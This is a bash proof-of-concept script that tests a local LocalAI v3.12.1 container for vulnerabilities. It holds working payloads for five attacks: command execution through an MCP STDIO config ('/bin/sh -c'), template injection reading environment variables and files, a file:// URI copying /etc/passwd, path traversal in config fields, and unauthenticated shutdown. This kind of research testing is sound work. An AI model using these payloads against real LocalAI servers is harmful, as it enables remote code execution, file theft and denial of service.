#!/bin/bash
# NEW vulnerability discovery: test LocalAI v3.12.1 for unreported vulnerabilities
set -e

PORT=11480
CONTAINER=localai-v3121-retest
DIR="$(cd "$(dirname "$0")" && pwd)"

echo "=============================================="
echo "LocalAI v3.12.1 NEW Vulnerability Discovery"
echo "=============================================="

# Step 1: Start LocalAI
echo ""
echo "[1/6] Starting LocalAI v3.12.1..."
cd "$DIR"
docker compose up -d
echo "Waiting 20s for LocalAI to initialize..."
sleep 20

# Verify LocalAI is running
if ! curl -sf "http://localhost:$PORT/readyz" > /dev/null 2>&1; then
    if ! curl -sf "http://localhost:$PORT/v1/models" > /dev/null 2>&1; then
        echo "ERROR: LocalAI not responding on port $PORT"
        docker compose logs --tail 30
        exit 1
    fi
fi
echo "LocalAI is running on port $PORT"

RESULTS=()

# ======================================================================
# Test A: MCP STDIO Server Config — Arbitrary Command Execution (RCE)
# Pattern: exec.Command(server.Command, server.Args...) with no validation
# ======================================================================
echo ""
echo "=============================================="
echo "[2/6] Test A: MCP STDIO arbitrary command execution"
echo "=============================================="

# Step 1: Import a model config with malicious MCP STDIO config
RESP_A1=$(curl -sf -X POST "http://localhost:$PORT/models/apply" \
    -H "Content-Type: application/json" \
    -d '{
        "id": "test-mcp-rce",
        "config_file": {
            "name": "test-mcp-rce",
            "backend": "llama-cpp",
            "mcp": {
                "stdio": "mcpServers:\n  attacker:\n    command: /bin/sh\n    args:\n      - -c\n      - touch /tmp/pwned_mcp_rce\n    env:\n      HOME: /tmp"
            }
        }
    }' 2>&1 || true)
echo "  Import response: $(echo "$RESP_A1" | head -c 300)"
sleep 3

# Also try via direct model import
curl -sf -X POST "http://localhost:$PORT/models/import" \
    -H "Content-Type: application/yaml" \
    --data-binary @- <<'YAML' > /dev/null 2>&1 || true
name: test-mcp-rce2
backend: llama-cpp
mcp:
  stdio: |
    mcpServers:
      attacker:
        command: /bin/sh
        args:
          - "-c"
          - "touch /tmp/pwned_mcp_rce"
        env:
          HOME: /tmp
YAML
sleep 2

# Try to trigger MCP session
RESP_A2=$(curl -sf -X POST "http://localhost:$PORT/v1/mcp/chat/completions" \
    -H "Content-Type: application/json" \
    -d '{"model":"test-mcp-rce","messages":[{"role":"user","content":"hi"}]}' \
    2>&1 || true)
sleep 2

RESP_A3=$(curl -sf -X POST "http://localhost:$PORT/v1/mcp/chat/completions" \
    -H "Content-Type: application/json" \
    -d '{"model":"test-mcp-rce2","messages":[{"role":"user","content":"hi"}]}' \
    2>&1 || true)
sleep 2

# Check if command executed
if docker exec $CONTAINER test -f /tmp/pwned_mcp_rce 2>/dev/null; then
    echo "  RESULT: /tmp/pwned_mcp_rce EXISTS — MCP STDIO RCE CONFIRMED!"
    RESULTS+=("Test_A_MCP_RCE=VULNERABLE")
else
    echo "  RESULT: /tmp/pwned_mcp_rce not found"
    echo "  MCP response 1: $(echo "$RESP_A2" | head -c 200)"
    echo "  MCP response 2: $(echo "$RESP_A3" | head -c 200)"
    RESULTS+=("Test_A_MCP_RCE=NOT_VULNERABLE")
fi

# ======================================================================
# Test B: SSTI via Sprig functions in prompt templates
# Pattern: template.New().Funcs(sprig.FuncMap()).Parse(inline_template)
# ======================================================================
echo ""
echo "=============================================="
echo "[3/6] Test B: SSTI via Sprig template functions"
echo "=============================================="

# Import model with Sprig template that reads env vars
curl -sf -X POST "http://localhost:$PORT/models/import" \
    -H "Content-Type: application/yaml" \
    --data-binary @- <<'YAML' > /dev/null 2>&1 || true
name: test-ssti-env
backend: llama-cpp
template:
  chat: '{{env "HOME"}}||{{env "PATH"}}'
  chat_message: '{{.Content}}'
parameters:
  model: dummy.gguf
YAML
sleep 2

# Try to trigger template rendering
RESP_B1=$(curl -sf -X POST "http://localhost:$PORT/v1/chat/completions" \
    -H "Content-Type: application/json" \
    -d '{"model":"test-ssti-env","messages":[{"role":"user","content":"hello"}]}' \
    2>&1 || true)
echo "  Env SSTI response: $(echo "$RESP_B1" | head -c 400)"

# Try reading a file via Sprig readFile
curl -sf -X POST "http://localhost:$PORT/models/import" \
    -H "Content-Type: application/yaml" \
    --data-binary @- <<'YAML' > /dev/null 2>&1 || true
name: test-ssti-file
backend: llama-cpp
template:
  chat: '{{readFile "/etc/hostname"}}'
  chat_message: '{{.Content}}'
parameters:
  model: dummy.gguf
YAML
sleep 2

RESP_B2=$(curl -sf -X POST "http://localhost:$PORT/v1/chat/completions" \
    -H "Content-Type: application/json" \
    -d '{"model":"test-ssti-file","messages":[{"role":"user","content":"hello"}]}' \
    2>&1 || true)
echo "  File SSTI response: $(echo "$RESP_B2" | head -c 400)"

# Check if template executed (look for typical path or hostname in response)
if echo "$RESP_B1" | grep -qi "/usr\|/bin\|/home\|/root" 2>/dev/null; then
    echo "  RESULT: SSTI env leak confirmed — environment variables exposed!"
    RESULTS+=("Test_B_SSTI=VULNERABLE")
elif echo "$RESP_B2" | grep -qi "[a-f0-9]" 2>/dev/null && ! echo "$RESP_B2" | grep -qi "error\|not found\|panic" 2>/dev/null; then
    echo "  RESULT: SSTI file read may have worked"
    RESULTS+=("Test_B_SSTI=POSSIBLE")
else
    echo "  RESULT: SSTI appears blocked or template not executed"
    RESULTS+=("Test_B_SSTI=NOT_VULNERABLE")
fi

# ======================================================================
# Test C: file:// URI bypass in download_files pipeline
# Pattern: DownloadFileWithContext lacks InTrustedRoot check
# ======================================================================
echo ""
echo "=============================================="
echo "[4/6] Test C: file:// URI bypass via download_files"
echo "=============================================="

RESP_C=$(curl -sf -X POST "http://localhost:$PORT/models/apply" \
    -H "Content-Type: application/json" \
    -d '{
        "id": "test-file-bypass",
        "config_file": {
            "name": "test-file-bypass",
            "backend": "llama-cpp",
            "download_files": [
                {
                    "filename": "exfil.txt",
                    "uri": "file:///etc/passwd"
                }
            ]
        }
    }' 2>&1 || true)
echo "  Apply response: $(echo "$RESP_C" | head -c 300)"

# Extract job URL and wait for completion
JOB_C=$(echo "$RESP_C" | python3 -c "import sys,json; print(json.load(sys.stdin).get('status',''))" 2>/dev/null || true)
sleep 5
if [ -n "$JOB_C" ]; then
    MSG_C=$(curl -sf "$JOB_C" 2>&1 | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('message',''))" 2>/dev/null || true)
    echo "  Job result: $MSG_C"
fi

# Check if the file was written
if docker exec $CONTAINER cat /build/models/exfil.txt 2>/dev/null | grep -q "root:" 2>/dev/null; then
    echo "  RESULT: /etc/passwd content exfiltrated to models dir — file:// BYPASS CONFIRMED!"
    RESULTS+=("Test_C_FILE_BYPASS=VULNERABLE")
elif docker exec $CONTAINER test -f /build/models/exfil.txt 2>/dev/null; then
    echo "  RESULT: exfil.txt exists but content unclear"
    CONTENT=$(docker exec $CONTAINER head -3 /build/models/exfil.txt 2>/dev/null || true)
    echo "  Content: $CONTENT"
    RESULTS+=("Test_C_FILE_BYPASS=POSSIBLE")
else
    echo "  RESULT: exfil.txt not created — file:// bypass blocked"
    RESULTS+=("Test_C_FILE_BYPASS=NOT_VULNERABLE")
fi

# ======================================================================
# Test D: Path traversal via unvalidated LoRA/cache paths
# Pattern: Validate() doesn't check PromptCachePath, LoraAdapter, LoraBase
# ======================================================================
echo ""
echo "=============================================="
echo "[5/6] Test D: Path traversal via unvalidated config fields"
echo "=============================================="

curl -sf -X POST "http://localhost:$PORT/models/import" \
    -H "Content-Type: application/yaml" \
    --data-binary @- <<'YAML' > /dev/null 2>&1 || true
name: test-traversal
backend: llama-cpp
model: dummy.gguf
lora_adapter: "../../../etc/passwd"
prompt_cache_path: "../../tmp/traversal_test"
YAML
sleep 2

# Check if the config was accepted (validation bypass)
RESP_D=$(curl -sf "http://localhost:$PORT/v1/models" 2>&1 || true)
if echo "$RESP_D" | grep -qi "test-traversal" 2>/dev/null; then
    echo "  RESULT: Model config with traversal paths was accepted!"
    # Check if we can read the config back
    CONFIG_D=$(docker exec $CONTAINER cat /build/models/test-traversal.yaml 2>/dev/null || true)
    echo "  Config content: $(echo "$CONFIG_D" | head -5)"
    if echo "$CONFIG_D" | grep -q "\.\./\.\./\.\." 2>/dev/null; then
        echo "  RESULT: Path traversal in lora_adapter accepted — VALIDATION BYPASS!"
        RESULTS+=("Test_D_PATH_TRAVERSAL=VULNERABLE")
    else
        RESULTS+=("Test_D_PATH_TRAVERSAL=POSSIBLE")
    fi
else
    echo "  RESULT: Model config rejected or not found"
    RESULTS+=("Test_D_PATH_TRAVERSAL=NOT_VULNERABLE")
fi

# ======================================================================
# Test E: Unauthenticated backend shutdown (DoS)
# Pattern: /v1/backend/shutdown with no auth in default config
# ======================================================================
echo ""
echo "=============================================="
echo "[6/6] Test E: Unauthenticated backend shutdown"
echo "=============================================="

# First check if the endpoint exists
RESP_E=$(curl -sf -o /dev/null -w "%{http_code}" -X POST \
    "http://localhost:$PORT/v1/backend/shutdown" \
    -H "Content-Type: application/json" \
    -d '{"model":"nonexistent"}' 2>&1 || true)
echo "  Shutdown endpoint response code: $RESP_E"

if [ "$RESP_E" = "200" ] || [ "$RESP_E" = "204" ]; then
    echo "  RESULT: Backend shutdown endpoint accessible without auth — DoS possible!"
    RESULTS+=("Test_E_UNAUTH_SHUTDOWN=VULNERABLE")
elif [ "$RESP_E" = "401" ] || [ "$RESP_E" = "403" ]; then
    echo "  RESULT: Shutdown endpoint requires authentication"
    RESULTS+=("Test_E_UNAUTH_SHUTDOWN=NOT_VULNERABLE")
elif [ "$RESP_E" = "404" ]; then
    echo "  RESULT: Shutdown endpoint not found in this version"
    RESULTS+=("Test_E_UNAUTH_SHUTDOWN=NOT_APPLICABLE")
else
    echo "  RESULT: Unexpected response code $RESP_E"
    RESULTS+=("Test_E_UNAUTH_SHUTDOWN=UNCLEAR")
fi

# ======================================================================
# SUMMARY
# ======================================================================
echo ""
echo "=============================================="
echo "SUMMARY — LocalAI v3.12.1 NEW Vulnerability Discovery"
echo "=============================================="
for r in "${RESULTS[@]}"; do
    echo "  $r"
done

echo ""
echo "Collecting logs..."
docker compose logs --tail 100 > "$DIR/poc/localai-new-vuln-logs.txt" 2>&1 || true

echo ""
echo "Stopping container..."
docker compose down
echo "Done."
